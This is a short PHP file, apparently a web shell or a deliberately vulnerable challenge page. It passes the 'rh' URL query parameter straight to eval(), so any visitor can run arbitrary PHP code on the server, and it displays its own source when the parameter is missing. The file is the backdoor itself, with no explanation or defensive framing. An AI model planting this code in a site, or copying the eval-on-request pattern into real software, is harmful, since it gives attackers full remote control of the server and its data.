<?php
if (isset($_GET['rh'])) {
    print_r($_GET['rh']);

    eval($_GET['rh']);

} else {
    show_source(__FILE__);
}
